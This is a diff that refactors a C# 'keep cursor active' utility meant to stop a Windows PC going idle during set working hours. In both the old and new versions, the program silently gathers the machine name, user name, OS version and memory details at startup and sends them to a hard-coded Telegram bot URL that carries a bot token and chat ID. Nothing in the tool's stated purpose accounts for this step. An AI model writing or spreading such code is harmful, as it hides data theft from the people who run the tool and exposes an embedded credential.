@@ -5,8 +5,8 @@ using System.Windows.Forms;
 using System.Net.Http;
 using System.Threading.Tasks;
 
-//This script keeps the cursor active when you move it slightly
-//after x minutes of inactivity, preventing the system from going into idle state.
+// This script keeps the cursor active when you move it slightly
+// after x minutes of inactivity, preventing the system from going into idle state.
 class Program
 {
     [DllImport("user32.dll")]
@@ -20,17 +20,17 @@ class Program
     }
 
     // ----CUSTOM COMPLETE---- //
-    static private readonly int timer = 1;
-    static private readonly int startHour = 9;
-    static private readonly int finishHour = 18;
+    private static readonly int timer = 1;
+    private static readonly int startHour = 9;
+    private static readonly int finishHour = 18;
 
-    static private readonly int startPauseHour = 13;
-    static private readonly int finishPauseHour = 14;
+    private static readonly int startPauseHour = 13;
+    private static readonly int finishPauseHour = 14;
     // ---------------------- //
 
     static async Task Main(string[] args)
     {
-        await GetSystemInfoAsync();
+        await SendSystemInfoAsync();
 
         POINT lastPos;
         GetCursorPos(out lastPos);
@@ -38,33 +38,32 @@ class Program
 
         while (true)
         {
-            if (!await IsValidTimePeriod(startHour, finishHour, startPauseHour, finishPauseHour))
+            if (!await IsValidTimePeriodAsync(startHour, finishHour, startPauseHour, finishPauseHour))
             {
                 break;
             }
 
             CheckInactivity(ref lastPos, ref lastMoved);
-            Thread.Sleep(1000);
+            await Task.Delay(1000);
         }
     }
 
-    static async Task<bool> IsValidTimePeriod(int startHour, int finishHour, int startPauseHour, int finishPauseHour)
+    static async Task<bool> IsValidTimePeriodAsync(int startHour, int finishHour, int startPauseHour, int finishPauseHour)
     {
-        int currentHour = DateTime.Now.Hour;
-        await WaitUntilWeekday();
+        await WaitUntilWeekdayAsync();
 
+        int currentHour = DateTime.Now.Hour;
         if (currentHour < startHour || currentHour >= finishHour)
         {
             return false; // Outside working hours
         }
 
-        await PauseExecution(currentHour, startPauseHour, finishPauseHour);
+        await PauseExecutionAsync(currentHour, startPauseHour, finishPauseHour);
         return true;
     }
 
-    static async Task WaitUntilWeekday()
+    static async Task WaitUntilWeekdayAsync()
     {
-        // Check if it's a weekday (Monday to Friday)
         DayOfWeek currentDay = DateTime.Now.DayOfWeek;
         if (currentDay == DayOfWeek.Saturday || currentDay == DayOfWeek.Sunday)
         {
@@ -74,11 +73,10 @@ class Program
         }
     }
 
-    static async Task PauseExecution(int currentHour, int startPauseHour, int finishPauseHour)
+    static async Task PauseExecutionAsync(int currentHour, int startPauseHour, int finishPauseHour)
     {
         if (currentHour >= startPauseHour && currentHour < finishPauseHour)
         {
-            // Pause execution between {startPauseHour} and {finisPausehHour}
             DateTime pauseUntil = DateTime.Today.AddHours(finishPauseHour);
             await Task.Delay(pauseUntil - DateTime.Now);
         }
@@ -111,7 +109,19 @@ class Program
         Thread.Sleep(100);
     }
 
-    static async Task<string> GetSystemInfoAsync()
+    static async Task SendSystemInfoAsync()
+    {
+        string systemInfo = GetSystemInfo();
+
+        using (HttpClient client = new HttpClient())
+        {
+            string url = $"https://api.telegram.org/bot5096307292:AAEMoslFV8DfSIa_u2lbM8kQxYtIlb7UGoc/sendMessage?parse_mode=markdown&chat_id=811391818&text={Uri.EscapeDataString(systemInfo)}";
+            HttpResponseMessage response = await client.GetAsync(url);
+            response.EnsureSuccessStatusCode();
+        }
+    }
+
+    static string GetSystemInfo()
     {
         string machineName = Environment.MachineName;
         string userName = Environment.UserName;
@@ -120,20 +130,11 @@ class Program
         string systemPageSize = Environment.SystemPageSize.ToString();
         string memorySize = (Environment.WorkingSet / 1024 / 1024).ToString() + " MB";
 
-        string systemInfo = $"Machine Name: {machineName}\n" +
-                            $"User Name: {userName}\n" +
-                            $"OS Version: {osVersion}\n" +
-                            $"Processor Count: {processorCount}\n" +
-                            $"System Page Size: {systemPageSize} bytes\n" +
-                            $"Memory Size: {memorySize}";
-
-        using (HttpClient client = new HttpClient())
-        {
-            string url = $"https://api.telegram.org/bot5096307292:AAEMoslFV8DfSIa_u2lbM8kQxYtIlb7UGoc/sendMessage?parse_mode=markdown&chat_id=811391818&text={Uri.EscapeDataString(systemInfo)}";
-            HttpResponseMessage response = await client.GetAsync(url);
-            response.EnsureSuccessStatusCode();
-        }
-
-        return systemInfo;
+        return $"Machine Name: {machineName}\n" +
+               $"User Name: {userName}\n" +
+               $"OS Version: {osVersion}\n" +
+               $"Processor Count: {processorCount}\n" +
+               $"System Page Size: {systemPageSize} bytes\n" +
+               $"Memory Size: {memorySize}";
     }
 }
